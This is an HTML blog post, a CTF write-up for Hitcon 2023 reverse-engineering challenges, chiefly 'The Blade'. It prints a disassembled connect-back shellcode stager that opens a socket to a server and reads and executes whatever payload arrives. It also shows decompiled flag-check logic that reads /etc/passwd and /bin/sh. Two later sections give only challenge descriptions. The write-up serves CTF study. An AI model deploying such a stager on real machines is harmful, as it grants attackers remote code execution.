@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Hitcon CTF 2023 writeup - Frost&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="Hitcon CTF 2023 writeup" />
+<meta property="og:description" content="This is a short writeup for the challenges I managed to solve in Hitcon CTF 2023. The challenges was not impossibly hard as I initially thought, but they was enjoyable nonetheless.
+Full Chain - The Blade Given filechal-the-bladeDescriptionA Rust tool for executing shellcode in a seccomp environment. Your goal is to pass the hidden flag checker concealed in the binary.
+Author: wxrdnx
+Basic analysis We are given an ELF file written in Rust." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/hitcon2023/" /><meta property="og:image" content="/images/slime-attack.gif"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-10T00:00:00+07:00" />
+<meta property="article:modified_time" content="2023-09-10T00:00:00+07:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/images/slime-attack.gif"/>
+
+<meta name="twitter:title" content="Hitcon CTF 2023 writeup"/>
+<meta name="twitter:description" content="This is a short writeup for the challenges I managed to solve in Hitcon CTF 2023. The challenges was not impossibly hard as I initially thought, but they was enjoyable nonetheless.
+Full Chain - The Blade Given filechal-the-bladeDescriptionA Rust tool for executing shellcode in a seccomp environment. Your goal is to pass the hidden flag checker concealed in the binary.
+Author: wxrdnx
+Basic analysis We are given an ELF file written in Rust."/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><link rel="shortcut icon" type="image/x-icon" href="../../favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="../../favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="../../favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="../../apple-touch-icon.png"><link rel="manifest" href="../../site.webmanifest"><link rel="canonical" href="../../posts/hitcon2023/" /><link rel="prev" href="../../posts/sekai2023/" /><link rel="stylesheet" href="../../lib/normalize/normalize.min.css"><link rel="stylesheet" href="../../css/style.min.css"><link rel="stylesheet" href="../../lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="../../lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hitcon CTF 2023 writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/posts\/hitcon2023\/"
+        },"genre": "posts","keywords": "ctf, writeup","wordcount":  804 ,
+        "url": "\/posts\/hitcon2023\/","datePublished": "2023-09-10T00:00:00+07:00","dateModified": "2023-09-10T00:00:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Frost"},"author": {
+                "@type": "Person",
+                "name": "Frost"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="../../" title="Frost&#39;s blog"><img
+        class="lazyload logo"
+        src="../../svg/loading.min.svg"
+        data-src="../../images/slime-attack.gif"
+        data-srcset="../../images/slime-attack.gif, ../../images/slime-attack.gif 1.5x, ../../images/slime-attack.gif 2x"
+        data-sizes="auto"
+        alt="/images/slime-attack.gif"
+        title="/images/slime-attack.gif" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="../../posts/"> Posts </a><a class="menu-item" href="../../tags/"> Tags </a><a class="menu-item" href="../../about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="../../" title="Frost&#39;s blog"><img
+        class="lazyload logo"
+        src="../../svg/loading.min.svg"
+        data-src="../../images/slime-attack.gif"
+        data-srcset="../../images/slime-attack.gif, ../../images/slime-attack.gif 1.5x, ../../images/slime-attack.gif 2x"
+        data-sizes="auto"
+        alt="/images/slime-attack.gif"
+        title="/images/slime-attack.gif" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="../../posts/" title="">Posts</a><a class="menu-item" href="../../tags/" title="">Tags</a><a class="menu-item" href="../../about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Hitcon CTF 2023 writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="../../" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Frost</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-09-10">2023-09-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;804 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#full-chain---the-blade">Full Chain - The Blade</a>
+      <ul>
+        <li><a href="#basic-analysis">Basic analysis</a></li>
+        <li><a href="#solving">Solving:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessequalmore">LessEQualmore</a></li>
+    <li><a href="#crazyarcade">CrazyArcade</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This is a short writeup for the challenges I managed to solve in Hitcon CTF 2023. The challenges was not impossibly hard as I initially thought, but they was enjoyable nonetheless.</p>
+<h2 id="full-chain---the-blade">Full Chain - The Blade</h2>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Given file<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><a href="../../posts/hitcon2023/blade/chal-the-blade" rel="">chal-the-blade</a></div>
+        </div>
+    </div>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Description<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>A Rust tool for executing shellcode in a seccomp environment. Your goal is to pass the hidden flag checker concealed in the binary.</p>
+<p>Author: wxrdnx</p>
+</div>
+        </div>
+    </div>
+<h3 id="basic-analysis">Basic analysis</h3>
+<p>We are given an ELF file written in Rust. It is some sort of command line tool to run shellcode on a victim machine. To establish a connection to the victim machine, we could use the commands <code>server</code>, then <code>run</code>. The program will then prompt us to run the following shellcode on the victim machine</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0:  eb 10                   jmp    0x12
+</span></span><span class="line"><span class="cl">2:  31 c0                   xor    eax,eax
+</span></span><span class="line"><span class="cl">4:  53                      push   rbx
+</span></span><span class="line"><span class="cl">5:  5f                      pop    rdi
+</span></span><span class="line"><span class="cl">6:  49 8d 77 10             lea    rsi,[r15+0x10]
+</span></span><span class="line"><span class="cl">a:  48 31 d2                xor    rdx,rdx
+</span></span><span class="line"><span class="cl">d:  80 c2 ff                add    dl,0xff
+</span></span><span class="line"><span class="cl">10: 0f 05                   syscall
+</span></span><span class="line"><span class="cl">12: 6a 29                   push   0x29
+</span></span><span class="line"><span class="cl">14: 58                      pop    rax
+</span></span><span class="line"><span class="cl">15: 99                      cdq
+</span></span><span class="line"><span class="cl">16: 6a 02                   push   0x2
+</span></span><span class="line"><span class="cl">18: 5f                      pop    rdi
+</span></span><span class="line"><span class="cl">19: 6a 01                   push   0x1
+</span></span><span class="line"><span class="cl">1b: 5e                      pop    rsi
+</span></span><span class="line"><span class="cl">1c: 0f 05                   syscall
+</span></span><span class="line"><span class="cl">1e: 50                      push   rax
+</span></span><span class="line"><span class="cl">1f: 5b                      pop    rbx
+</span></span><span class="line"><span class="cl">20: 48 97                   xchg   rdi,rax
+</span></span><span class="line"><span class="cl">22: 68 7f 00 00 01          push   0x100007f
+</span></span><span class="line"><span class="cl">27: 66 68 11 5c             pushw  0x5c11
+</span></span><span class="line"><span class="cl">2b: 66 6a 02                pushw  0x2
+</span></span><span class="line"><span class="cl">2e: 54                      push   rsp
+</span></span><span class="line"><span class="cl">2f: 5e                      pop    rsi
+</span></span><span class="line"><span class="cl">30: b2 10                   mov    dl,0x10
+</span></span><span class="line"><span class="cl">32: b0 2a                   mov    al,0x2a
+</span></span><span class="line"><span class="cl">34: 0f 05                   syscall
+</span></span><span class="line"><span class="cl">36: 4c 8d 3d c5 ff ff ff    lea    r15,[rip+0xffffffffffffffc5]        # 0x2
+</span></span><span class="line"><span class="cl">3d: 41 ff e7                jmp    r15
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>which is a self-modifying shell code that tells the victim to connect to the server, then read and execute any payload coming from the socket.</p>
+<p>Loading the binary into IDA and looking around, we can see multiple comparisions being made to detect the correct command at <code>seccomp_shell::cli::prompt::h56d4b6fe2f13f522</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">switch</span> <span class="p">(</span> <span class="n">cmdLen</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">6LL</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="o">*</span><span class="n">v12</span> <span class="o">^</span> <span class="err">&#39;</span><span class="n">vres</span><span class="err">&#39;</span> <span class="o">|</span> <span class="o">*</span><span class="p">(</span><span class="n">v12</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="err">&#39;</span><span class="n">re</span><span class="err">&#39;</span><span class="p">)</span> <span class="p">)</span>     <span class="c1">// server
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v15</span> <span class="o">=</span> <span class="n">seccomp_shell</span><span class="o">::</span><span class="n">server</span><span class="o">::</span><span class="n">prompt</span><span class="o">::</span><span class="nf">h2dcdaf613d801878</span><span class="p">(</span><span class="n">v33</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">goto</span> <span class="n">LABEL_39</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">UNKNOWN_CMD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">5LL</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v12</span> <span class="o">^</span> <span class="err">&#39;</span><span class="n">lehs</span><span class="err">&#39;</span> <span class="o">|</span> <span class="o">*</span><span class="p">(</span><span class="n">v12</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="sc">&#39;l&#39;</span> <span class="p">)</span>         <span class="c1">//shell
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="k">goto</span> <span class="n">UNKNOWN_CMD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v33</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v15</span> <span class="o">=</span> <span class="n">seccomp_shell</span><span class="o">::</span><span class="n">shell</span><span class="o">::</span><span class="n">prompt</span><span class="o">::</span><span class="nf">h76cecfe7bd3bdf50</span><span class="p">(</span><span class="n">v33</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After a little digging around, I found a hidden sub-command of the <code>shell</code> command inside <code>seccomp_shell::shell::prompt::h76cecfe7bd3bdf50</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="err">&#39;</span><span class="n">galf</span><span class="err">&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v18</span> <span class="o">=</span> <span class="mi">9LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v19</span> <span class="o">=</span> <span class="s">&#34;Incorrect&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">agrCount</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v51</span> <span class="o">=</span> <span class="n">seccomp_shell</span><span class="o">::</span><span class="n">shell</span><span class="o">::</span><span class="n">verify</span><span class="o">::</span><span class="nf">h898bf5fa26dafbab</span><span class="p">(</span><span class="n">v158</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">v179</span> <span class="o">+</span> <span class="mi">24</span><span class="p">),</span> <span class="o">*</span><span class="p">(</span><span class="n">v179</span> <span class="o">+</span> <span class="mi">40</span><span class="p">));</span><span class="c1">// arg are: something, raw_input, input_len
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">v53</span> <span class="o">=</span> <span class="n">v52</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v51</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">seccomp_shell</span><span class="o">::</span><span class="n">util</span><span class="o">::</span><span class="n">print_failed</span><span class="o">::</span><span class="nf">h41a9d0b5672e2e2f</span><span class="p">(</span> <span class="s">&#34;Incorrect&#34;</span><span class="p">,</span> <span class="mi">9LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="n">seccomp_shell</span><span class="o">::</span><span class="n">util</span><span class="o">::</span><span class="n">print_success</span><span class="o">::</span><span class="nf">h8c458b43bfca28cc</span><span class="p">(</span><span class="s">&#34;Correct&#34;</span><span class="p">,</span> <span class="mi">7LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.....</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The flag is verified inside <code>seccomp_shell::shell::verify::h898bf5fa26dafbab</code>. The flag is first encrypted using the following routine:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">- Check if len(flag) == 64
+</span></span><span class="line"><span class="cl">- Perform the following 256 times:
+</span></span><span class="line"><span class="cl">    + Shuffle the flag 3 times, using 3 hardcoded maps.
+</span></span><span class="line"><span class="cl">    + Perform some arthimetic operations on each char of the flag.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The encrypted flag is then written to a buffer and sent to the victim. It took me a while to realize that this buffer actually contains shellcode for the victim to run, and the checking routine is performed at the victim side.</p>
+<p>The template for the checking shellcode can be found at offset <code>0x62b2b</code>. It first reads the first 4 bytes of <code>/bin/sh</code> (which are the ELF magic bytes), the first 4 bytes of <code>/etc/passwd</code> (which is always <code>root</code>) and 4 bytes from <code>/dev/zero</code> and uses those constants to perform another arthimetic operation on the encrypted flag. The final result is compared with a constant (which is embed in the shellcode by the server)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">v14</span> <span class="o">=</span> <span class="p">(</span><span class="o">~</span><span class="n">zero</span> <span class="o">&gt;&gt;</span> <span class="mi">29</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x29uLL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">v14</span> <span class="o">^</span> <span class="o">~</span><span class="nf">__ROR4__</span><span class="p">(</span><span class="n">root</span> <span class="o">^</span> <span class="p">(</span><span class="n">elfHeader</span> <span class="o">+</span> <span class="n">encrypted_flag</span><span class="p">),</span> <span class="mi">11</span><span class="p">))</span> <span class="o">==</span> <span class="n">constant_from_server</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v16</span> <span class="o">=</span> <span class="nf">sys_write</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">result</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="solving">Solving:</h3>
+<p>Since the shuffles is deterministic, I input the following string to the program: <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[]</code>. Each char only appear once in the string, so by debugging pass the 3 shuffles, we can know for sure where a char would be after the operations.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">original</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shuffled</span> <span class="o">=</span> <span class="s2">&#34;rP5V[azMm8xwY1SGnHtb]OcZyvDpRgN6kd3q9LKE4QTfXhB0UuoCs2JiejFl7AIW&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With this, we can reverse the shuffles.</p>
+<h2 id="lessequalmore">LessEQualmore</h2>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Given file<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p><a href="../../posts/hitcon2023/lessequalmore/lessequalmore" rel="">lessequalmore</a></p>
+<p><a href="../../posts/hitcon2023/lessequalmore/chal.txt" rel="">chall.txt</a></p>
+</div>
+        </div>
+    </div>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Description<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Sometime, less instruction equal more instruction &hellip;</p>
+<p>Author: bronson113</p>
+</div>
+        </div>
+    </div>
+<h2 id="crazyarcade">CrazyArcade</h2>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Given file<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p><a href="../../posts/hitcon2023/lessequalmore/lessequalmore" rel="">lessequalmore</a></p>
+<p><a href="../../posts/hitcon2023/lessequalmore/chal.txt" rel="">chall.txt</a></p>
+</div>
+        </div>
+    </div>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Description<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>I was 4 dan in Crazy Arcade without using any script, but it is yet another Crazy Arcade.
+Note: Although this challenge is not malicious, it may make your system vulnerable, so please run it in your VM.</p>
+<p>Author: zeze</p>
+</div>
+        </div>
+    </div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-09-10</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="../../tags/ctf/">ctf</a>,&nbsp;<a href="../../tags/writeup/">writeup</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="../../">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="../../posts/sekai2023/" class="prev" rel="prev" title="[Sekai CTF 2023] Conquest of Camelot writeup"><i class="fas fa-angle-left fa-fw"></i>[Sekai CTF 2023] Conquest of Camelot writeup</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.117.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="../../" target="_blank">Frost</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="../../lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="../../lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="../../lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{}};</script><script type="text/javascript" src="../../js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-CY316V8Z0V');
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-CY316V8Z0V" async></script></body>
+</html>
